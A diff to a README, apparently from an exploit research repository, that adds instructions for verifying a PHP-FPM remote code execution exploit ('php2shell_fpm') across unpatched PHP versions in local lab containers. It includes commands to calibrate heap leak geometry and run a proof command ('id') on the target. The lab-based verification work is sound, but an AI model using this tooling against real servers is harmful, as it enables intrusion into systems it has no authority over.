@@ -501,6 +501,29 @@ make validate   # profile against schema
 make ci         # lint + test + validate
 ```
 
+### Verifying the whole unpatched matrix
+
+```sh
+make matrix                                        # every unpatched branch
+python3 tools/php2shell_fpm_matrix.py 7.4.33 8.3.35   # just these
+```
+
+For each version the runner starts its own lab, calibrates the profile over
+HTTP when it is not verified yet, runs the remote endgame, and prints one
+line per version. Patched releases are skipped: they cannot RCE by design.
+A single version is verified with the two commands below (the ports come from
+`php2shell_fpm_labs.py builds_map`):
+
+```sh
+python3 tools/php2shell_fpm_labs.py up --only 7.4.33
+python3 tools/php2shell_fpm.py --version 7.4.33 \
+  --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
+  calibrate          # discovers leak + reclaim geometry, writes the profile
+python3 tools/php2shell_fpm.py --version 7.4.33 \
+  --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
+  --command 'id>out/p1' --proof-file out/p1 no-oracle
+```
+
 ## CI/CD
 
 GitHub Actions is configured in `.github/workflows/`:
